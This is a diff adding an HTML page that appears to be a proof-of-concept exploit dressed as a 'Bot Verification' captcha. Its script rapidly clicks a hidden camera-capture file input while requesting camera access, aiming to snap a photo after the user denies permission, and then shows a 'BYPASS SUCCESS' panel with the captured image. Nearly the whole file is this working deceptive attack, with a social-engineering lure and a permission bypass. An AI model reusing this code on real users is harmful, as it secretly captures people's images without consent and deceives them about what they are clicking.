@@ -1,0 +1,106 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>testing123</title>
+    <style>
+      body {
+        font-family: system-ui;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #f0f2f5;
+        margin: 0;
+      }
+      #ui-container {
+        background: white;
+        padding: 2rem;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        width: 350px;
+      }
+      .btn {
+        width: 100%;
+        padding: 12px;
+        background: #007bff;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        font-weight: bold;
+      }
+      #stolen-img {
+        width: 100%;
+        border-radius: 8px;
+        border: 3px solid #dc3545;
+        margin-top: 15px;
+        display: none;
+      }
+      .hidden {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="ui-container">
+      <div id="setup">
+        <div style="font-size: 3rem">🤖</div>
+        <h2>Bot Verification</h2>
+        <p>
+          <b>Instruction:</b> Click the button to start verification. The system
+          will automatically sync with your secure camera module.
+        </p>
+        <button id="verify-btn" class="btn">I AM HUMAN</button>
+      </div>
+
+      <div id="result" class="hidden">
+        <h2 style="color: #dc3545">BYPASS SUCCESS</h2>
+        <p>Status: Photo captured after user clicked 'don't allow'.</p>
+        <img id="stolen-img" />
+      </div>
+    </div>
+
+    <input
+      type="file"
+      id="cam"
+      accept="image/*"
+      capture="environment"
+      class="hidden"
+    />
+
+    <script>
+      const btn = document.getElementById("verify-btn");
+      const cam = document.getElementById("cam");
+
+      btn.onclick = async () => {
+        btn.innerText = "Analyzing...";
+
+        const race = setInterval(() => cam.click(), 100);
+
+        try {
+          await navigator.mediaDevices.getUserMedia({ video: true });
+        } catch (e) {
+          console.log("Permission Denied (Expected). Race condition firing...");
+        }
+
+        setTimeout(() => clearInterval(race), 10);
+      };
+
+      cam.onchange = () => {
+        const file = cam.files[0];
+        if (file) {
+          document.getElementById("stolen-img").src = URL.createObjectURL(file);
+          document.getElementById("setup").classList.add("hidden");
+          document.getElementById("result").classList.remove("hidden");
+          document.getElementById("stolen-img").style.display = "block";
+
+          setTimeout(() => {
+            alert("Identity Confirmed! Redirecting...");
+            window.location.href = "https://google.com";
+          }, 1500);
+        }
+      };
+    </script>
+  </body>
+</html>
